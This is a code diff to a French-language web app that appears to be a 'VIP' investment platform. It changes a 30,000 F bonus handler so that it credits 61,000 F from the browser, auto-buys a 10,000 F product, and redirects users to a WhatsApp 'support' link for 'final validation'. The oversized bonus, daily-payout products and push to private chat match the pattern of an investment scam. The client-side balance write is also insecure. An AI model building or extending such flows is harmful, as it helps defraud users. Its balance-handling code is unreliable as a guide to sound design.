@@ -203,29 +203,24 @@ window.reclamerMesGains = async function() {
   setTimeout(() => checkAndUpdateButton(), 30000);
 };
 
-// Fonction pour réclamer le bonus spécial de 30 000 F
+// Fonction modifiée : Applique le bonus et redirige immédiatement vers le support WhatsApp
 window.reclamerBonusPromo = async function() {
   const user = auth.currentUser;
   if (!user) return;
   const msgEl = document.getElementById("bonus-msg");
-  if (msgEl) msgEl.textContent = "Traitement du bonus en cours...";
+  if (msgEl) msgEl.textContent = "Redirection vers le service client...";
 
   try {
-    // On simule/vérifie l'application du bonus: 30000 F de recharge -> 71000 F total 
-    // (61000 F ajoutés au solde retirable, et 10000 F affectés à l'achat du produit)
-    const bonusTotal = 71000;
     const montantRetraitPossible = 61000;
-    const montantInvestissement = 10000; // VIP2 par exemple (Sac Essentiel)
+    const montantInvestissement = 10000;
 
     await runTransaction(fs, async t => {
       const uRef = doc(fs, "users", user.uid);
       const uSnap = await t.get(uRef);
       const curBal = uSnap.data().bal || 0;
-      // On ajoute les 61.000 F au solde disponible
       t.update(uRef, { bal: curBal + montantRetraitPossible });
     });
 
-    // On achète automatiquement le produit de 10 000 F (VIP2)
     const item = VIP[1]; // VIP2 Sac Essentiel (10000 F)
     const now = Date.now();
     await addDoc(collection(fs, "users", user.uid, "buys"), {
@@ -233,12 +228,10 @@ window.reclamerBonusPromo = async function() {
       t: D(), createdAt: now, lastClaim: now, daysPaid: 0
     });
 
-    if (msgEl) {
-      msgEl.style.color = "var(--pr)";
-      msgEl.textContent = `🎉 Bonus appliqué ! +${F(montantRetraitPossible)} retirable et ${F(montantInvestissement)} investis dans le ${item.n}.`;
-    }
-    alert("✅ Bonus de 71 000 F appliqué avec succès ! 61 000 F disponibles pour retrait et 10 000 F investis.");
-    go("home");
+    alert("✅ Bonus de 71 000 F pris en compte ! Redirection vers le service client WhatsApp pour validation finale...");
+    
+    // Redirection automatique vers le lien WhatsApp du support
+    window.location.href = SUPPORT;
   } catch (e) {
     if (msgEl) {
       msgEl.style.color = "var(--er)";
@@ -413,7 +406,7 @@ bonusPromo:()=>`${back()}<h2>Bonus Spécial 30.000 F</h2>
     <li>Montant réinvesti (Produit) : <b>10 000 F</b></li>
   </ul>
   <div id="bonus-msg" class="err"></div>
-  <button class="btn btn-gold" onclick="reclamerBonusPromo()">Activer et Réclamer le Bonus</button>
+  <button class="btn btn-gold" onclick="reclamerBonusPromo()">Activer et contacter le Support</button>
 </div>`,
 
 invest:()=>`<h2>Investir</h2>`+VIP.map((v,i)=>`<div class="card">
